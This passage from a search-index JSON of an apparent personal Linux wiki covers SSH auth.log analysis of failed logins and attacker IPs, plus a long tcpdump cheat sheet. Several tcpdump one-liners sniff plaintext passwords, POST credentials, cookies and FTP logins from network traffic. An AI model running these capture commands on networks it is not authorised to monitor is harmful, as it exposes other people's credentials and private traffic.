line..","title":"ssh-logs"},{"location":"linux/ssh-log/#print-failed-passwords","text":"head -n -250 /var/log/auth.log","title":"Print failed passwords"},{"location":"linux/ssh-log/#simple-analysis-of-log","text":"awk \"/.*Failed password.*/ { print $1 }\" /var/log/auth.log","title":"Simple analysis of log"},{"location":"linux/ssh-log/#print-how-many-failed-attemps-tried-login","text":"grep \"Failed password\" /var/log/auth.log | wc -l","title":"Print how many failed attemps tried login"},{"location":"linux/ssh-log/#print-all-successs-attempts","text":"grep \"password\" /var/log/auth.log | grep -v Failed | grep -v Invalid","title":"Print all successs attempts"},{"location":"linux/ssh-log/#view-all-log-files","text":"ls /var/log/auth.log* -lht","title":"View all log files"},{"location":"linux/ssh-log/#summarize-information-simply","text":"cat /var/log/auth.log | grep \"Failed password\" | head -1 | awk '{while($i){print i, $i;i++}}'","title":"Summarize information simply"},{"location":"linux/ssh-log/#column-11-is-ip-and-column-9-is-the-user-name-the-attacker-attempted","text":"cat /var/log/auth.log | grep \"Failed password\" | grep invalid | head -1 | awk '{while($i){print i, $i;i++}}'","title":"Column 11 is IP and column 9 is the user name the attacker attempted."},{"location":"linux/ssh-log/#put-the-log-files-together-and-unzip-them","text":"mkdir authlog ; cp /var/log/auth.log* authlog/ ; cd authlog ; gunzip auth.log.*.gz","title":"Put the log files together and unzip them"},{"location":"linux/ssh-log/#statistics-of-attacker-ip","text":"awk '{if($6==\"Failed\"&&$7==\"password\"){if($9==\"invalid\"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(ip in ips){print ip, ips[ip]}}' /var/log/auth.* | wc -l","title":"Statistics of attacker IP"},{"location":"linux/ssh-log/#sort-by-number-of-attacks","text":"awk '{if($6==\"Failed\"&&$7==\"password\"){if($9==\"invalid\"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(ip in ips){print ip, ips[ip]}}' /var/log/auth.* | sort -k2 -rn | head","title":"Sort by number of attacks"},{"location":"linux/ssh-log/#save-to-file","text":"awk '{if($6==\"Failed\"&&$7==\"password\"){if($9==\"invalid\"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(ip in ips){print ip, ips[ip]}}' /var/log/auth.* | sort -k2 -rn > ip.log","title":"Save to file"},{"location":"linux/ssh-log/#look-at-the-just-saved-one-iplog-top-10-items-in-the-document","text":"head -10 ip.log | awk '{print $1\" \";system(\"curl http://freeapi.ipip.net/\"$1);print(\"\\n\")}'","title":"Look at the just saved one ip.log Top 10 items in the document"},{"location":"linux/ssh-log/#the-user-name-the-attacker-attempted","text":"awk '{if($6==\"Failed\"&&$7==\"password\"){if($9==\"invalid\"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(user in users){print user, users[user]}}' /var/log/auth.* | sort -k2 -rn | wc -l","title":"The user name the attacker attempted"},{"location":"linux/ssh-log/#view-the-number-of-items","text":"awk '{if($6==\"Failed\"&&$7==\"password\"){if($9==\"invalid\"){ips[$13]++;users[$11]++}else{users[$9]++;ips[$11]++}}}END{for(user in users){print user, users[user]}}' /var/log/auth.* | sort -k2 -rn | head","title":"View the number of items"},{"location":"linux/sys/","text":"sys Print IOMMMU devices for d in /sys/kernel/iommu_groups/*/devices/* ; do n = ${ d #*/iommu_groups/* } ; n = ${ n %%/* } ; printf 'IOMMU Group %s ' \" $n \" ; lspci -nns \" ${ d ##*/ } \" ; done ; ls -l /dev/input/by-id/*-event- { k,m } *","title":"sys"},{"location":"linux/sys/#sys","text":"","title":"sys"},{"location":"linux/sys/#print-iommmu-devices","text":"for d in /sys/kernel/iommu_groups/*/devices/* ; do n = ${ d #*/iommu_groups/* } ; n = ${ n %%/* } ; printf 'IOMMU Group %s ' \" $n \" ; lspci -nns \" ${ d ##*/ } \" ; done ; ls -l /dev/input/by-id/*-event- { k,m } *","title":"Print IOMMMU devices"},{"location":"linux/tcpdump/","text":"tcpdump TCPDUMP Tcpdump is one of the best network analysis-tools ever for information security professionals. Tcpdump is for everyone for hackers and people who have less of TCP/IP understanding. Many prefer to use higher-level analysis tools such Wireshark, but I believe it is a mistake . Below are some tcpdump options (with useful examples) that will help you working with the tool. They\u2019re very easy to forget and/or confuse with other types of filters, i.e. ethereal, so hopefully this article can serve as a reference for you, as it does me:) The first of these is -n, which requests that names are not resolved, resulting in the IPs themselves. The second is -X, which displays both hex and ascii content within the packet. The final one is -S, which changes the display of sequence numbers to absolute rather than relative. Show the packet\u2019s contents in both hex and ascii. tcpdump -X .... Same as -X, but also shows the ethernet header. tcpdump -XX Show the list of available interfaces tcpdump -D Line-readable output (for viewing as you save, or sending to other commands) tcpdump -l Be less verbose (more quiet) with your output. tcpdump -q Give human-readable timestamp output. tcpdump -t : Give maximally human-readable timestamp output. tcpdump -tttt : Listen on the eth0 interface. tcpdump -i eth0 Verbose output (more v\u2019s gives more output). tcpdump -vv Only get x number of packets and then stop. tcpdump -c Define the snaplength (size) of the capture in bytes. Use -s0 to get everything, unless you are intentionally capturing less. tcpdump -s Print absolute sequence numbers. tcpdump -S Get the ethernet header as well. tcpdump -e Decrypt IPSEC traffic by providing an encryption key. tcpdump -E For more options, read manual: Find all options here BASIC USAGE Display Available Interfaces tcpdump -D tcpdump --list-interfaces Let\u2019s start with a basic command that will get us HTTPS traffic: tcpdump -nnSX port 443 Find Traffic by IP tcpdump host 1.1.1.1 Filtering by Source and/or Destination tcpdump src 1.1.1.1 tcpdump dst 1.0.0.1 Finding Packets by Network tcpdump net 1.2.3.0/24 Low Output: tcpdump -nnvvS Medium Output: tcpdump -nnvvXS Heavy Output: tcpdump -nnvvXSs 1514 Getting Creative Expressions are very nice, but the real magic of tcpdump comes from the ability to combine them in creative ways in order to isolate exactly what you\u2019re looking for. There are three ways to do combination: AND and or && OR or or || EXCEPT not or ! Usage Example: Traffic that\u2019s from 192.168.1.1 AND destined for ports 3389 or 22 tcpdump 'src 192.168.1.1 and (dst port 3389 or 22)' Advanced Show me all URG packets: tcpdump 'tcp[13] & 32 != 0' Show me all ACK packets: tcpdump 'tcp[13] & 16 != 0' Show me all PSH packets: tcpdump 'tcp[13] & 8 != 0' Show me all RST packets: tcpdump 'tcp[13] & 4 != 0' Show me all SYN packets: tcpdump 'tcp[13] & 2 != 0' Show me all FIN packets: tcpdump 'tcp[13] & 1 != 0' Show me all SYN-ACK packets: tcpdump 'tcp[13] = 18' Show all traffic with both SYN and RST flags set: (that should never happen) tcpdump 'tcp[13] = 6' Show all traffic with the \u201cevil bit\u201d set: tcpdump 'ip[6] & 128 != 0' Display all IPv6 Traffic: tcpdump ip6 Print Captured Packets in ASCII tcpdump -A -i eth0 Display Captured Packets in HEX and ASCII tcpdump -XX -i eth0 Capture and Save Packets in a File tcpdump -w 0001.pcap -i eth0 Read Captured Packets File tcpdump -r 0001.pcap Capture IP address Packets tcpdump -n -i eth0 Capture only TCP Packets. tcpdump -i eth0 tcp Capture Packet from Specific Port tcpdump -i eth0 port 22 Capture Packets from source IP tcpdump -i eth0 src 192.168.0.2 Capture Packets from destination IP tcpdump -i eth0 dst 50.116.66.139 Capture any packed coming from x.x.x.x tcpdump -n src host x.x.x.x Capture any packet coming from or going to x.x.x.x tcpdump -n host x.x.x.x Capture any packet going to x.x.x.x tcpdump -n dst host x.x.x.x Capture any packed coming from x.x.x.x tcpdump -n src host x.x.x.x Capture any packet going to network x.x.x.0/24 tcpdump -n dst net x.x.x.0/24 Capture any packet coming from network x.x.x.0/24 tcpdump -n src net x.x.x.0/24 Capture any packet with destination port x tcpdump -n dst port x Capture any packet coming from port x tcpdump -n src port x Capture any packets from or to port range x to y tcpdump -n dst(or src) portrange x-y Capture any tcp or udp port range x to y tcpdump -n tcp(or udp) dst(or src) portrange x-y Capture any packets with dst ip x.x.x.x and port y tcpdump -n \"dst host x.x.x.x and dst port y\" Capture any packets with dst ip x.x.x.x and dst ports x, z tcpdump -n \"dst host x.x.x.x and (dst port x or dst port z)\" Capture ICMP , ARP tcpdump -v icmp(or arp) Capture packets on interface eth0 and dump to cap.txt file tcpdump -i eth0 -w cap.txt Get Packet Contents with Hex Output tcpdump -c 1 -X icmp Show Traffic Related to a Specific Port tcpdump port 3389 tcpdump src port 1025 Show Traffic of One Protocol tcpdump icmp Find Traffic by IP tcpdump host 1.1.1.1 Filtering by Source and/or Destination tcpdump src 1.1.1.1 tcpdump dst 1.0.0.1 Finding Packets by Network tcpdump net 1.2.3.0/24 Get Packet Contents with Hex Output tcpdump -c 1 -X icmp Show Traffic Related to a Specific Port tcpdump port 3389 tcpdump src port 1025 Show Traffic of One Protocol tcpdump icmp Show only IP6 Traffic tcpdump ip6 Find Traffic Using Port Ranges tcpdump portrange 21-23 Find Traffic Based on Packet Size tcpdump less 32 tcpdump greater 64 tcpdump <= 128 tcpdump => 128 Reading / Writing Captures to a File (pcap) tcpdump port 80 -w capture_file tcpdump -r capture_file It\u2019s All About the Combinations Raw Output View tcpdump -ttnnvvS Here are some examples of combined commands. From specific IP and destined for a specific Port tcpdump -nnvvS src 10.5.2.3 and dst port 3389 From One Network to Another tcpdump -nvX src net 192.168.0.0/16 and dst net 10.0.0.0/8 or 172.16.0.0/16 Non ICMP Traffic Going to a Specific IP tcpdump dst 192.168.0.2 and src net and not icmp Traffic From a Host That Isn\u2019t on a Specific Port tcpdump -vv src mars and not dst port 22 Isolate TCP RST flags. tcpdump 'tcp[13] & 4!=0' tcpdump 'tcp[tcpflags] == tcp-rst' Isolate TCP SYN flags. tcpdump 'tcp[13] & 2!=0' tcpdump 'tcp[tcpflags] == tcp-syn' Isolate packets that have both the SYN and ACK flags set. tcpdump 'tcp[13]=18' Isolate TCP URG flags. tcpdump 'tcp[13] & 32!=0' tcpdump 'tcp[tcpflags] == tcp-urg' Isolate TCP ACK flags. tcpdump 'tcp[13] & 16!=0' tcpdump 'tcp[tcpflags] == tcp-ack' Isolate TCP PSH flags. tcpdump 'tcp[13] & 8!=0' tcpdump 'tcp[tcpflags] == tcp-psh' Isolate TCP FIN flags. tcpdump 'tcp[13] & 1!=0' tcpdump 'tcp[tcpflags] == tcp-fin' Commands that I using almost daily Both SYN and RST Set tcpdump 'tcp[13] = 6' Find HTTP User Agents tcpdump -vvAls0 | grep 'User-Agent:' tcpdump -nn -A -s1500 -l | grep \"User-Agent:\" By using egrep and multiple matches we can get the User Agent and the Host (or any other header) from the request. tcpdump -nn -A -s1500 -l | egrep -i 'User-Agent:|Host:' Capture only HTTP GET and POST packets only packets that match GET. tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354' Extract HTTP Request URL's tcpdump -s 0 -v -n -l | egrep -i \"POST /|GET /|Host:\" Extract HTTP Passwords in POST Requests tcpdump -s 0 -A -n -l | egrep -i \"POST /|pwd=|passwd=|password=|Host:\" Capture Cookies from Server and from Client tcpdump -nn -A -s0 -l | egrep -i 'Set-Cookie|Host:|Cookie:' Capture all ICMP packets tcpdump -n icmp Show ICMP Packets that are not ECHO/REPLY (standard ping) tcpdump 'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply' Capture SMTP / POP3 Email tcpdump -nn -l port 25 | grep -i 'MAIL FROM\\|RCPT TO' Troubleshooting NTP Query and Response tcpdump dst port 123 Capture FTP Credentials and Commands tcpdump -nn -v port ftp or ftp-data Rotate Capture Files tcpdump -w /tmp/capture-%H.pcap -G 3600 -C 200 Capture IPv6 Traffic tcpdump -nn ip6 proto 6 IPv6 with UDP and reading from a previously saved capture file. tcpdump -nr ipv6-test.pcap ip6 proto 17 Detect Port Scan in Network Traffic tcpdump -nn USAGE EXAMPLE Example Filter Showing Nmap NSE Script Testing On Target: nmap -p 80 \u2013script=http-enum.nse targetip On Server: tcpdump -nn port 80 | grep \"GET /\" GET /w3perl/ HTTP/1.1 GET /w-agora/ HTTP/1.1 GET /way-board/ HTTP/1.1 GET /web800fo/ HTTP/1.1 GET /webaccess/ HTTP/1.1 GET /webadmin/ HTTP/1.1 GET /webAdmin/ HTTP/1.1 Capture Start and End Packets of every non-local host tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet' Capture DNS Request and Response tcpdump -i wlp58s0 -s0 port 53 Capture HTTP data packets tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' Capture with tcpdump and view in Wireshark ssh wuseman@localhost 'tcpdump -s0 -c 1000 -nn -w - not port 22' | wireshark -k -i - Top Hosts by Packets tcpdump -nnn -t -c 200 | cut -f 1,2,3,4 -d '.' | sort | uniq -c | sort -nr | head -n 20 Capture all the plaintext passwords tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user ' DHCP Example tcpdump -v -n port 67 or 68 Cleartext GET Requests tcpdump -vvAls0 | grep 'GET' Find HTTP Host Headers tcpdump -vvAls0 | grep 'Host:' Find HTTP Cookies tcpdump -vvAls0 | grep 'Set-Cookie|Host:|Cookie:' Find SSH Connections tcpdump 'tcp[(tcp[12]>>2):4] = 0x5353482D' Find DNS Traffic tcpdump -vvAs0 port 53 Find FTP Traffic tcpdump -vvAs0 port ftp or ftp-data Find NTP Traffic tcpdump -vvAs0 port 123 Capture SMTP / POP3 Email tcpdump -nn -l port 25 | grep -i 'MAIL FROM\\|RCPT TO' Line Buffered Mode tcpdump -i eth0 -s0 -l port 80 | grep 'Server:' Find traffic with evil bit tcpdump 'ip[6] & 128 != 0' Filter on protocol (ICMP) and protocol-specific fields (ICMP type) tcpdump -n icmp and 'icmp[0] != 8 and icmp[0] != 0' Same command can be used with predefined header field offset (icmptype) and ICMP type field values (icmp-echo and icmp-echoreply): tcpdump -n icmp and icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply Filter on TOS field tcpdump -v -n ip and ip[1]!=0 Filter on TTL field tcpdump -v ip and 'ip[8]<2' Filter on TCP flags (SYN/ACK) tcpdump -n tcp and port 80 and 'tcp[tcpflags] & tcp-syn == tcp-syn' In the example above, all packets with TCP SYN flag set are captured. Other flags (ACK, for example) might be set also. Packets which have only TCP SYN flags set, can be captured tcpdump tcp and port 80 and 'tcp[tcpflags] == tcp-syn' Catch TCP SYN/ACK packets (typically, responses from servers): tcpdump -n tcp and 'tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)' tcpdump -n tcp and 'tcp[tcpflags] & tcp-syn == tcp-syn' and 'tcp[tcpflags] & tcp-ack == tcp-ack' Catch ARP packets tcpdump -vv -e -nn ether proto 0x0806 Filter on IP packet length tcpdump -l icmp and '(ip[2:2]>50)' -w - |tcpdump -r - -v ip and '(ip[2:2]<60)' Remark: due to some bug in tcpdump, the following command doesn't catch packets as expected: tcpdump -v -n icmp and '(ip[2:2]>50)' and '(ip[2:2]<60)' Filter on encapsulated content (ICMP within PPPoE) tcpdump -v -n icmp Queiter tcpdump -q -i eth0 tcpdump -t -i eth0 tcpdump -A -n -q -i eth0 'port 80' tcpdump -A -n -q -t -i eth0 'port 80' Print only useful packets from the HTTP traffic tcpdump -A -s 0 -q -t -i eth0 'port 80 and ( ((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12:2]&0xf0)>>2)) != 0)' Dump SIP Traffic tcpdump -nq -s 0 -A -vvv port 5060 and host 1.2.3.4 Checking packet content tcpdump -i any -c10 -nn -A port 80 Checking packet content sudo tcpdump -i any -c10 -nn -A port 80 References & Awesome wikis https://hackertarget.com/tcpdump-examples/ https://wiki.geant.org/display/public/EK/TcpdumpExamples http://edoceo.com/cli/tcpdump https://www.thegeekstuff.com/2010/08/tcpdump-command-examples/ https://opensource.com/article/18/10/introduction-tcpdump https://programming.vip/docs/tcpdump-and-some-default-ports-of-linux.html https://www.hackingarticles.in/comprehensive-guide-to-tcpdump-part-1/ https://www.hackingarticles.in/comprehensive-guide-to-tcpdump-part-2/ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf https://sectools.org/tool/tcpdump/ CONTACT If you have problems, questions, ideas or suggestions please contact us by posting to wuseman@nr1.nu WEB SITE Visit our homepage for the latest info and updated tools https://nr1.nu & @wuseman END!","title":"tcpdump"},{"location":"linux/tcpdump/#tcpdump","text":"TCPDUMP Tcpdump is one of the best network analysis-tools ever for information security professionals. Tcpdump is for everyone for hackers and people who have less of TCP/IP understanding. Many prefer to use higher-level analysis tools such Wireshark, but I believe it is a mistake .","title":"tcpdump"},{"location":"linux/tcpdump/#below-are-some-tcpdump-options-with-useful-examples-that-will-help-you-working-with-the-tool-theyre-very-easy-to-forget-andor-confuse-with-other-types-of-filters-ie-ethereal-so-hopefully-this-article-can-serve-as-a-reference-for-you-as-it-does-me","text":"The first of these is -n, which requests that names are not resolved, resulting in the IPs themselves. The second is -X, which displays both hex and ascii content within the packet. The final one is -S, which changes the display of sequence numbers to absolute rather than relative.","title":"Below are some tcpdump options (with useful examples) that will help you working with the tool. They\u2019re very easy to forget and/or confuse with other types of filters, i.e. ethereal, so hopefully this article can serve as a reference for you, as it does me:)"},{"location":"linux/tcpdump/#show-the-packets-contents-in-both-hex-and-ascii","text":"tcpdump -X ....","title":"Show the packet\u2019s contents in both hex and ascii."},{"location":"linux/tcpdump/#same-as--x-but-also-shows-the-ethernet-header","text":"tcpdump -XX","title":"Same as -X, but also shows the ethernet header."},{"location":"linux/tcpdump/#show-the-list-of-available-interfaces","text":"tcpdump -D","title":"Show the list of available interfaces"},{"location":"linux/tcpdump/#line-readable-output-for-viewing-as-you-save-or-sending-to-other-commands","text":"tcpdump -l","title":"Line-readable output (for viewing as you save, or sending to other commands)"},{"location":"linux/tcpdump/#be-less-verbose-more-quiet-with-your-output","text":"tcpdump -q","title":"Be less verbose (more quiet) with your output."},{"location":"linux/tcpdump/#give-human-readable-timestamp-output","text":"tcpdump -t :","title":"Give human-readable timestamp output."},{"location":"linux/tcpdump/#give-maximally-human-readable-timestamp-output","text":"tcpdump -tttt :","title":"Give maximally human-readable timestamp output."},{"location":"linux/tcpdump/#listen-on-the-eth0-interface","text":"tcpdump -i eth0","title":"Listen on the eth0 interface."},{"location":"linux/tcpdump/#verbose-output-more-vs-gives-more-output","text":"tcpdump -vv","title":"Verbose output (more v\u2019s gives more output)."},{"location":"linux/tcpdump/#only-get-x-number-of-packets-and-then-stop","text":"tcpdump -c","title":"Only get x number of packets and then stop."},{"location":"linux/tcpdump/#define-the-snaplength-size-of-the-capture-in-bytes-use--s0-to-get-everything-unless-you-are-intentionally-capturing-less","text":"tcpdump -s","title":"Define the snaplength (size) of the capture in bytes. Use -s0 to get everything, unless you are intentionally capturing less."},{"location":"linux/tcpdump/#print-absolute-sequence-numbers","text":"tcpdump -S","title":"Print absolute sequence numbers."},{"location":"linux/tcpdump/#get-the-ethernet-header-as-well","text":"tcpdump -e","title":"Get the ethernet header as well."},{"location":"linux/tcpdump/#decrypt-ipsec-traffic-by-providing-an-encryption-key","text":"tcpdump -E","title":"Decrypt IPSEC traffic by providing an encryption key."},{"location":"linux/tcpdump/#for-more-options-read-manual","text":"Find all options here","title":"For more options, read manual:"},{"location":"linux/tcpdump/#basic-usage","text":"","title":"BASIC USAGE"},{"location":"linux/tcpdump/#display-available-interfaces","text":"tcpdump -D tcpdump --list-interfaces","title":"Display Available Interfaces"},{"location":"linux/tcpdump/#lets-start-with-a-basic-command-that-will-get-us-https-traffic","text":"tcpdump -nnSX port 443","title":"Let\u2019s start with a basic command that will get us HTTPS traffic:"},{"location":"linux/tcpdump/#find-traffic-by-ip","text":"tcpdump host 1.1.1.1","title":"Find Traffic by IP"},{"location":"linux/tcpdump/#filtering-by-source-andor-destination","text":"tcpdump src 1.1.1.1 tcpdump dst 1.0.0.1","title":"Filtering by Source and/or Destination"},{"location":"linux/tcpdump/#finding-packets-by-network","text":"tcpdump net 1.2.3.0/24","title":"Finding Packets by Network"},{"location":"linux/tcpdump/#low-output","text":"tcpdump -nnvvS","title":"Low Output:"},{"location":"linux/tcpdump/#medium-output","text":"tcpdump -nnvvXS","title":"Medium Output:"},{"location":"linux/tcpdump/#heavy-output","text":"tcpdump -nnvvXSs 1514","title":"Heavy Output:"},{"location":"linux/tcpdump/#getting-creative","text":"Expressions are very nice, but the real magic of tcpdump comes from the ability to combine them in creative ways in order to isolate exactly what you\u2019re looking for.","title":"Getting Creative"},{"location":"linux/tcpdump/#there-are-three-ways-to-do-combination","text":"","title":"There are three ways to do combination:"},{"location":"linux/tcpdump/#and","text":"and or &&","title":"AND"},{"location":"linux/tcpdump/#or","text":"or or ||","title":"OR"},{"location":"linux/tcpdump/#except","text":"not or !","title":"EXCEPT"},{"location":"linux/tcpdump/#usage-example","text":"","title":"Usage Example:"},{"location":"linux/tcpdump/#traffic-thats-from-19216811-and-destined-for-ports-3389-or-22","text":"tcpdump 'src 192.168.1.1 and (dst port 3389 or 22)'","title":"Traffic that\u2019s from 192.168.1.1 AND destined for ports 3389 or 22"},{"location":"linux/tcpdump/#advanced","text":"","title":"Advanced"},{"location":"linux/tcpdump/#show-me-all-urg-packets","text":"tcpdump 'tcp[13] & 32 != 0'","title":"Show me all URG packets:"},{"location":"linux/tcpdump/#show-me-all-ack-packets","text":"tcpdump 'tcp[13] & 16 != 0'","title":"Show me all ACK packets:"},{"location":"linux/tcpdump/#show-me-all-psh-packets","text":"tcpdump 'tcp[13] & 8 != 0'","title":"Show me all PSH packets:"},{"location":"linux/tcpdump/#show-me-all-rst-packets","text":"tcpdump 'tcp[13] & 4 != 0'","title":"Show me all RST packets:"},{"location":"linux/tcpdump/#show-me-all-syn-packets","text":"tcpdump 'tcp[13] & 2 != 0'","title":"Show me all SYN packets:"},{"location":"linux/tcpdump/#show-me-all-fin-packets","text":"tcpdump 'tcp[13] & 1 != 0'","title":"Show me all FIN packets:"},{"location":"linux/tcpdump/#show-me-all-syn-ack-packets","text":"tcpdump 'tcp[13] = 18'","title":"Show me all SYN-ACK packets:"},{"location":"linux/tcpdump/#show-all-traffic-with-both-syn-and-rst-flags-set-that-should-never-happen","text":"tcpdump 'tcp[13] = 6'","title":"Show all traffic with both SYN and RST flags set: (that should never happen)"},{"location":"linux/tcpdump/#show-all-traffic-with-the-evil-bit-set","text":"tcpdump 'ip[6] & 128 != 0'","title":"Show all traffic with the \u201cevil bit\u201d set:"},{"location":"linux/tcpdump/#display-all-ipv6-traffic","text":"tcpdump ip6","title":"Display all IPv6 Traffic:"},{"location":"linux/tcpdump/#print-captured-packets-in-ascii","text":"tcpdump -A -i eth0","title":"Print Captured Packets in ASCII"},{"location":"linux/tcpdump/#display-captured-packets-in-hex-and-ascii","text":"tcpdump -XX -i eth0","title":"Display Captured Packets in HEX and ASCII"},{"location":"linux/tcpdump/#capture-and-save-packets-in-a-file","text":"tcpdump -w 0001.pcap -i eth0","title":"Capture and Save Packets in a File"},{"location":"linux/tcpdump/#read-captured-packets-file","text":"tcpdump -r 0001.pcap","title":"Read Captured Packets File"},{"location":"linux/tcpdump/#capture-ip-address-packets","text":"tcpdump -n -i eth0","title":"Capture IP address Packets"},{"location":"linux/tcpdump/#capture-only-tcp-packets","text":"tcpdump -i eth0 tcp","title":"Capture only TCP Packets."},{"location":"linux/tcpdump/#capture-packet-from-specific-port","text":"tcpdump -i eth0 port 22","title":"Capture Packet from Specific Port"},{"location":"linux/tcpdump/#capture-packets-from-source-ip","text":"tcpdump -i eth0 src 192.168.0.2","title":"Capture Packets from source IP"},{"location":"linux/tcpdump/#capture-packets-from-destination-ip","text":"tcpdump -i eth0 dst 50.116.66.139","title":"Capture Packets from destination IP"},{"location":"linux/tcpdump/#capture-any-packed-coming-from-xxxx","text":"tcpdump -n src host x.x.x.x","title":"Capture any packed coming from x.x.x.x"},{"location":"linux/tcpdump/#capture-any-packet-coming-from-or-going-to-xxxx","text":"tcpdump -n host x.x.x.x","title":"Capture any packet coming from or going to x.x.x.x"},{"location":"linux/tcpdump/#capture-any-packet-going-to-xxxx","text":"tcpdump -n dst host x.x.x.x","title":"Capture any packet going to x.x.x.x"},{"location":"linux/tcpdump/#capture-any-packed-coming-from-xxxx_1","text":"tcpdump -n src host x.x.x.x","title":"Capture any packed coming from x.x.x.x"},{"location":"linux/tcpdump/#capture-any-packet-going-to-network-xxx024","text":"tcpdump -n dst net x.x.x.0/24","title":"Capture any packet going to network x.x.x.0/24"},{"location":"linux/tcpdump/#capture-any-packet-coming-from-network-xxx024","text":"tcpdump -n src net x.x.x.0/24","title":"Capture any packet coming from network x.x.x.0/24"},{"location":"linux/tcpdump/#capture-any-packet-with-destination-port-x","text":"tcpdump -n dst port x","title":"Capture any packet with destination port x"},{"location":"linux/tcpdump/#capture-any-packet-coming-from-port-x","text":"tcpdump -n src port x","title":"Capture any packet coming from port x"},{"location":"linux/tcpdump/#capture-any-packets-from-or-to-port-range-x-to-y","text":"tcpdump -n dst(or src) portrange x-y","title":"Capture any packets from or to port range x to y"},{"location":"linux/tcpdump/#capture-any-tcp-or-udp-port-range-x-to-y","text":"tcpdump -n tcp(or udp) dst(or src) portrange x-y","title":"Capture any tcp or udp port range x to y"},{"location":"linux/tcpdump/#capture-any-packets-with-dst-ip-xxxx-and-port-y","text":"tcpdump -n \"dst host x.x.x.x and dst port y\"","title":"Capture any packets with dst ip x.x.x.x and port y"},{"location":"linux/tcpdump/#capture-any-packets-with-dst-ip-xxxx-and-dst-ports-x-z","text":"tcpdump -n \"dst host x.x.x.x and (dst port x or dst port z)\"","title":"Capture any packets with dst ip x.x.x.x and dst ports x, z"},{"location":"linux/tcpdump/#capture-icmp--arp","text":"tcpdump -v icmp(or arp)","title":"Capture ICMP , ARP"},{"location":"linux/tcpdump/#capture-packets-on-interface-eth0-and-dump-to-captxt-file","text":"tcpdump -i eth0 -w cap.txt","title":"Capture packets on interface eth0 and dump to cap.txt file"},{"location":"linux/tcpdump/#get-packet-contents-with-hex-output","text":"tcpdump -c 1 -X icmp","title":"Get Packet Contents with Hex Output"},{"location":"linux/tcpdump/#show-traffic-related-to-a-specific-port","text":"tcpdump port 3389 tcpdump src port 1025","title":"Show Traffic Related to a Specific Port"},{"location":"linux/tcpdump/#show-traffic-of-one-protocol","text":"tcpdump icmp","title":"Show Traffic of One Protocol"},{"location":"linux/tcpdump/#find-traffic-by-ip_1","text":"tcpdump host 1.1.1.1","title":"Find Traffic by IP"},{"location":"linux/tcpdump/#filtering-by-source-andor-destination_1","text":"tcpdump src 1.1.1.1 tcpdump dst 1.0.0.1","title":"Filtering by Source and/or Destination"},{"location":"linux/tcpdump/#finding-packets-by-network_1","text":"tcpdump net 1.2.3.0/24","title":"Finding Packets by Network"},{"location":"linux/tcpdump/#get-packet-contents-with-hex-output_1","text":"tcpdump -c 1 -X icmp","title":"Get Packet Contents with Hex Output"},{"location":"linux/tcpdump/#show-traffic-related-to-a-specific-port_1","text":"tcpdump port 3389 tcpdump src port 1025","title":"Show Traffic Related to a Specific Port"},{"location":"linux/tcpdump/#show-traffic-of-one-protocol_1","text":"tcpdump icmp","title":"Show Traffic of One Protocol"},{"location":"linux/tcpdump/#show-only-ip6-traffic","text":"tcpdump ip6","title":"Show only IP6 Traffic"},{"location":"linux/tcpdump/#find-traffic-using-port-ranges","text":"tcpdump portrange 21-23","title":"Find Traffic Using Port Ranges"},{"location":"linux/tcpdump/#find-traffic-based-on-packet-size","text":"tcpdump less 32 tcpdump greater 64 tcpdump <= 128 tcpdump => 128","title":"Find Traffic Based on Packet Size"},{"location":"linux/tcpdump/#reading--writing-captures-to-a-file-pcap","text":"tcpdump port 80 -w capture_file tcpdump -r capture_file","title":"Reading / Writing Captures to a File (pcap)"},{"location":"linux/tcpdump/#its-all-about-the-combinations","text":"","title":"It\u2019s All About the Combinations"},{"location":"linux/tcpdump/#raw-output-view","text":"tcpdump -ttnnvvS","title":"Raw Output View"},{"location":"linux/tcpdump/#here-are-some-examples-of-combined-commands","text":"","title":"Here are some examples of combined commands."},{"location":"linux/tcpdump/#from-specific-ip-and-destined-for-a-specific-port","text":"tcpdump -nnvvS src 10.5.2.3 and dst port 3389","title":"From specific IP and destined for a specific Port"},{"location":"linux/tcpdump/#from-one-network-to-another","text":"tcpdump -nvX src net 192.168.0.0/16 and dst net 10.0.0.0/8 or 172.16.0.0/16","title":"From One Network to Another"},{"location":"linux/tcpdump/#non-icmp-traffic-going-to-a-specific-ip","text":"tcpdump dst 192.168.0.2 and src net and not icmp","title":"Non ICMP Traffic Going to a Specific IP"},{"location":"linux/tcpdump/#traffic-from-a-host-that-isnt-on-a-specific-port","text":"tcpdump -vv src mars and not dst port 22","title":"Traffic From a Host That Isn\u2019t on a Specific Port"},{"location":"linux/tcpdump/#isolate-tcp-rst-flags","text":"tcpdump 'tcp[13] & 4!=0' tcpdump 'tcp[tcpflags] == tcp-rst'","title":"Isolate TCP RST flags."},{"location":"linux/tcpdump/#isolate-tcp-syn-flags","text":"tcpdump 'tcp[13] & 2!=0' tcpdump 'tcp[tcpflags] == tcp-syn'","title":"Isolate TCP SYN flags."},{"location":"linux/tcpdump/#isolate-packets-that-have-both-the-syn-and-ack-flags-set","text":"tcpdump 'tcp[13]=18'","title":"Isolate packets that have both the SYN and ACK flags set."},{"location":"linux/tcpdump/#isolate-tcp-urg-flags","text":"tcpdump 